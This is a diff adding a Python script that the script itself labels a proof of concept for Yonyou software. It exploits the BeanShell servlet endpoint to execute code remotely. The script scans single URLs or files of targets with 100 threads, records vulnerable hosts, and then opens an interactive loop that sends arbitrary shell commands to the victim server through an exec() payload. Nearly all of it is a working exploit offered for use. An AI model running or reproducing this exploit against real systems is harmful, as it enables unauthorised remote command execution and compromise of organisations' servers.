@@ -1,0 +1,94 @@
+import requests,sys,argparse,re,os,time
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test = """██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗
+╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║
+ ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║
+  ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║
+   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝
+   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝ 
+                                                               version 1.0.1
+                                                               author LYM
+
+"""
+    print(test)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='用友poc')
+    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        if poc(args.url):
+            exp(args.url)
+    elif args.file and not args.url:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+def poc(target):
+    payload = '/servlet/~ic/bsh.servlet.BshServlet'
+    headers = {
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding':'gzip, deflate',
+        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
+        'Cookie': 'JSESSIONID=6F81F16A658FEAF2F7DDAFB93971DA7C.server',
+        'Connection': 'close',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = 'bsh.script=print("falao!");'
+    try:
+        res1 = requests.get(url=target+payload,headers=headers,verify=False,timeout=15)
+        if res1.status_code == 200:
+            res2 = requests.post(url=target+payload,headers=headers,data=data)
+            match = re.findall(r'<pre>(.*?)</pre>',res2.text,re.S)
+            for i in match:
+                if 'falao' in i.strip():
+                    with open('result.txt','a',encoding='utf-8') as fp:
+                        fp.write(target+'\n')
+                        return True
+    except:
+        pass
+def exp(target):
+    url_payload = '/servlet/~ic/bsh.servlet.BshServlet'
+    headers = {
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding':'gzip, deflate',
+        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
+        'Cookie': 'JSESSIONID=6F81F16A658FEAF2F7DDAFB93971DA7C.server',
+        'Connection': 'close',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    print("正在努力给你搞一个shell...")
+    time.sleep(2)
+    os.system("cls")
+    while True:
+        cmd = input("请输入你要执行的命令：")
+        if cmd =="q":
+            exit()
+        data = 'bsh.script=exec("'+cmd+'");'
+        try:
+            res1 = requests.post(url=target+url_payload,headers=headers,data=data,verify=False)
+            result = re.findall('''<pre>(.*?)</pre>''',res1.text,re.S)[0]
+            print(result)
+        except:
+            print("您执行的命令错误")
+
+
+if __name__ == '__main__':
+    main()
